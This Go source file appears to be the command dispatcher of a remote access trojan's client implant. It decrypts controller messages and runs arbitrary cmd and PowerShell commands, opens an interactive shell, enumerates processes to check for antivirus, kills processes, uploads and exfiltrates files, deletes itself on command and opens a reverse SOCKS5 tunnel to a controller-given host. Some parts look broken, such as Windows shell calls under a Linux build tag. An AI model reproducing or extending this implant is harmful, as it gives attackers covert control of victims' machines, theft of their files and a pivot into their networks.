//go:build linux
// +build linux

package tcp

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"main/Encrypt"
	Function "main/Helper/function"
	handle "main/Helper/handle"
	Proxy "main/Helper/proxy"
	"main/MessagePack"
	"main/PcInfo"

	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/shirou/gopsutil/process"
)

var ProcessPath string
var FilePath string

func Read(Data []byte, Connection net.Conn) {
	unmsgpack := new(MessagePack.MsgPack)
	deData, err := Encrypt.Decrypt(Data)
	if err != nil {
		return
	}

	unmsgpack.DecodeFromBytes(deData)
	//fmt.Print(string(deData))
	switch unmsgpack.ForcePathObject("Pac_ket").GetAsString() {

	case "OSshell":

		cmd := exec.Command("cmd", "/c", unmsgpack.ForcePathObject("Command").GetAsString())

		var stdout, stderr bytes.Buffer
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr
		err := cmd.Run()
		result := stdout.String()
		if err != nil {
			if result == "" {
				result = stderr.String()
			}
		}

		SessionLog(result, "", Connection, unmsgpack)

	case "OSpowershell":
		{

			powershell := exec.Command("powershell", "-Command", unmsgpack.ForcePathObject("Command").GetAsString())

			var stdout, stderr bytes.Buffer
			powershell.Stdout = &stdout
			powershell.Stderr = &stderr

			err := powershell.Run()
			result := stdout.String()
			if err != nil {
				if result == "" {
					result = stderr.String()
				}
			}

			SessionLog(result, "", Connection, unmsgpack)

		}

	case "getDrivers":
		{
			handle.GetDrivers(Connection, SendData, unmsgpack)
		}

	case "GetCurrentPath":
		{
			handle.GetCurrentPath(Connection, SendData, unmsgpack)
		}

	case "CheckAV":
		{
			processList, err := process.Processes()
			if err != nil {
				fmt.Printf("Error fetching processes: %s\n", err)
				return
			}

			var stringBuilder strings.Builder
			for _, proc := range processList {
				name, err := proc.Name()
				if err != nil {
					continue
				}
				stringBuilder.WriteString(name + "-=>")
			}
			fmt.Println(stringBuilder.String())
			result := ""
			result = string(stringBuilder.String())
			utf8Stdout, err := Function.ConvertGBKToUTF8(result)
			if err != nil {
				//Log(err.Error(), Connection, unmsgpack)
				utf8Stdout = err.Error()
			}
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("BackSession")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Domain").SetAsString("CheckAVInfo")
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("ProcessIDClientHWID").SetAsString(PcInfo.GetProcessID() + PcInfo.GetHWID())
			msgpack.ForcePathObject("ProcessInfo").SetAsString(utf8Stdout)
			SendData(msgpack.Encode2Bytes(), Connection)
		}
	case "getPath":
		{

			switch unmsgpack.ForcePathObject("PathType").GetAsString() {
			case "RootPath":
				{
					wd, err := os.Getwd()
					if err != nil {
						SessionLog(err.Error(), "", Connection, unmsgpack)
						return
					}

					// 获取卷名
					volName := filepath.VolumeName(wd)
					if volName == "" {
						//fmt.Println("Root directory:", "/")
						FilePath = "/"
					} else {
						FilePath = volName + "//"
					}
				}
			default:
				{
					FilePath = unmsgpack.ForcePathObject("Path").GetAsString()
				}
			}

			handle.RefreshDir(Connection, SendData, unmsgpack)
		}
	case "renameFile":
		{
			handle.RenameFile(unmsgpack.ForcePathObject("OldName").GetAsString(), unmsgpack.ForcePathObject("NewName").GetAsString())
		}

	case "execute":
		{
			cmd := exec.Command(unmsgpack.ForcePathObject("ExecFilePath").GetAsString())
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			cmd.Start()
		}

	case "process":
		{
			handle.ProcessInfo(Connection, SendData, unmsgpack)
		}

	case "processKill":
		{
			PID := unmsgpack.ForcePathObject("PID").GetAsString()
			pid, err := strconv.Atoi(PID)
			handle.KillProcess(pid)
			if err != nil {
				SessionLog(err.Error(), "", Connection, unmsgpack)
			} else {
				SessionLog("Process %d killed.\n", "", Connection, unmsgpack)
			}
			handle.ProcessInfo(Connection, SendData, unmsgpack)
		}

	case "FileRead":
		{
			handle.FileRead(Connection, SendData, unmsgpack)
		}

	case "deleteFile":
		{
			handle.DeleteFile(Connection, SendData, unmsgpack)
		}

	case "cutFile":
		{
			handle.CutFile(strings.ReplaceAll(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), "\\", "/"), strings.ReplaceAll(unmsgpack.ForcePathObject("PasteFilePath").GetAsString(), "\\", "/"))
			handle.RefreshDir(Connection, SendData, unmsgpack)
		}

	case "pasteFile":
		{
			handle.PasteFile(unmsgpack.ForcePathObject("CopyFilePath").GetAsString(), unmsgpack.ForcePathObject("PasteFilePath").GetAsString())

			handle.RefreshDir(Connection, SendData, unmsgpack)
		}

	case "UploadFile":
		{
			fullPath := filepath.Join(unmsgpack.ForcePathObject("UploaFilePath").GetAsString(), unmsgpack.ForcePathObject("Name").GetAsString())
			normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "\\")
			err := ioutil.WriteFile(normalizedPathStr, unmsgpack.ForcePathObject("FileBin").GetAsBytes(), 0644)
			if err != nil {
				SessionLog("File writing failed! , please elevate privileges", "", Connection, unmsgpack)
			}
			handle.RefreshDir(Connection, SendData, unmsgpack)
		}

	case "downloadFile":
		{
			FilePath := unmsgpack.ForcePathObject("FilePath").GetAsString()
			normalizedPathStr := strings.ReplaceAll(FilePath, "\\", "/")
			data, err := ioutil.ReadFile(normalizedPathStr)
			if err != nil {

				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileError")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("Message").SetAsString(err.Error())
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				SendData(msgpack.Encode2Bytes(), Connection)

			} else {
				msgpack := new(MessagePack.MsgPack)
				msgpack.ForcePathObject("Pac_ket").SetAsString("fileDownload")
				msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
				msgpack.ForcePathObject("DWID").SetAsString(unmsgpack.ForcePathObject("DWID").GetAsString())
				msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
				msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
				msgpack.ForcePathObject(("Data")).SetAsBytes(data)
				msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
				msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
				SendData(msgpack.Encode2Bytes(), Connection)
			}
		}

	case "NewFolder":
		err := os.MkdirAll(unmsgpack.ForcePathObject("NewFolderName").GetAsString(), 0755)
		if err != nil {
			fmt.Printf("Error creating directory: %v\n", err)
		}

	case "NewFile":
		{
			file, err := os.Create(unmsgpack.ForcePathObject("NewFileName").GetAsString())
			if err != nil {
				SessionLog(err.Error(), "", Connection, unmsgpack)
				return
			}
			defer file.Close()
			result, err := handle.ListDir(unmsgpack.ForcePathObject("FileDir").GetAsString())
			if err != nil {
				SessionLog(err.Error(), "", Connection, unmsgpack)
				return
			}
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("FileDir").GetAsString())
			msgpack.ForcePathObject("File").SetAsString(result)
			SendData(msgpack.Encode2Bytes(), Connection)
		}

	case "ZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			err := handle.Zip(filename, filename+".zip")
			if err != nil {
				SessionLog(err.Error(), "", Connection, unmsgpack)
			}
		}
	case "UNZIP":
		{
			filename := unmsgpack.ForcePathObject("FileName").GetAsString()
			if !strings.HasSuffix(filename, ".zip") {
				SessionLog("FileName does not end with .zip", "", Connection, unmsgpack)
				return
			}
			err := handle.Unzip(filename, strings.ReplaceAll(filename, ".zip", ""))
			if err != nil {
				SessionLog((err.Error()), "", Connection, unmsgpack)
			}

		}

	case "NetWork":
		{
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("NetWorkInfo")
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("NetWorkInfoList").SetAsString(handle.Network())
			SendData(msgpack.Encode2Bytes(), Connection)
		}

	case "NoteAdd":
		{
			PcInfo.RemarkContext = unmsgpack.ForcePathObject("RemarkContext").GetAsString()
			PcInfo.RemarkColor = unmsgpack.ForcePathObject("RemarkColor").GetAsString()
		}
	case "Group":
		{
			PcInfo.GroupInfo = unmsgpack.ForcePathObject("GroupInfo").GetAsString()
		}

	case "option":
		{
			switch unmsgpack.ForcePathObject("Command").GetAsString() {
			case "Disconnnect":
				{
					Connection.Close()

				}
			}
		}

	case "ClientUnstaller":
		{
			exe, err := os.Executable()
			if err != nil {
				panic(err)
			}
			//fmt.Println(exe)
			os.Remove(exe)
			os.Exit(0)
		}
	case "ClientReboot":
		{
			exe, err := os.Executable()
			if err != nil {

			}
			cmd := exec.Command(exe)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err = cmd.Start()

			os.Exit(0)

		}

	case "shell":
		{

			cmd := exec.Command("cmd")

			result := ""
			output, err := cmd.Output()
			if err != nil {
				//Log(err.Error(), Connection, unmsgpack)
				result = err.Error()
			}
			result = string(output)
			dir, err := os.Getwd()
			if err != nil {
				//fmt.Println("Error:", err)
				return
			}
			ProcessPath = dir
			utf8Stdout, err := Function.ConvertGBKToUTF8(result)
			if err != nil {
				//Log(err.Error(), Connection, unmsgpack)
				utf8Stdout = err.Error()
			}
			msgpack := new(MessagePack.MsgPack)

			msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("ReadInput").SetAsString(utf8Stdout + "\n")
			SendData(msgpack.Encode2Bytes(), Connection)

		}
	case "shellWriteInput":
		{

			cmdString := unmsgpack.ForcePathObject("WriteInput").GetAsString() // 命令字符串

			//executeCommandAndHandleCD(cmdString)

			cmd := exec.Command("cmd", "/c", "cd "+ProcessPath+"&&"+cmdString)

			var stdout, stderr bytes.Buffer
			cmd.Stdout = &stdout
			cmd.Stderr = &stderr

			err := cmd.Run()
			result := stdout.String()

			if err != nil {
				//log.Printf("Command execution error: %v, error output: %s\n", err, stderr.String())
				if result == "" { // If there is no standard output, use error output
					result = stderr.String()
				}
			}

			utf8Stdout, err := Function.ConvertGBKToUTF8(result)
			if err != nil {
				//Log(err.Error(), Connection, unmsgpack)
				utf8Stdout = err.Error()
			}
			msgpack := new(MessagePack.MsgPack)
			msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
			msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
			msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
			msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
			msgpack.ForcePathObject("ReadInput").SetAsString(ProcessPath + "\\>" + unmsgpack.ForcePathObject("WriteInput").GetAsString() + "\n" + utf8Stdout)
			SendData(msgpack.Encode2Bytes(), Connection)

		}

	case "ReverseProxy":
		{
			Host := unmsgpack.ForcePathObject("Host").GetAsString()
			TunnelPort := unmsgpack.ForcePathObject("TunnelPort").GetAsString()
			Socks5Port := unmsgpack.ForcePathObject("Socks5Port").GetAsString()
			HPID := unmsgpack.ForcePathObject("HPID").GetAsString()
			UserName := unmsgpack.ForcePathObject("UserName").GetAsString()
			Password := unmsgpack.ForcePathObject("Password").GetAsString()
			fmt.Println(Host + ":" + TunnelPort)
			Proxy.ReverseSocksAgent(Host+":"+TunnelPort, "password", false, Connection, SendData, TunnelPort, Socks5Port, HPID, UserName, Password)
			//ReverseSocksAgent(serverAddress, psk, useTLS, wscConn, Function.SendData, TunnelPort, Socks5Port, HPID, UserName, Password)
		}

	}
}

func SendData(b []byte, Connection net.Conn) {
	Function.TcpSend(b, Connection)
}

func SessionLog(result string, Domain string, Connection net.Conn, msgPack *MessagePack.MsgPack) {
	Function.SessionLog(result, Domain, Connection, SendData, msgPack)
}
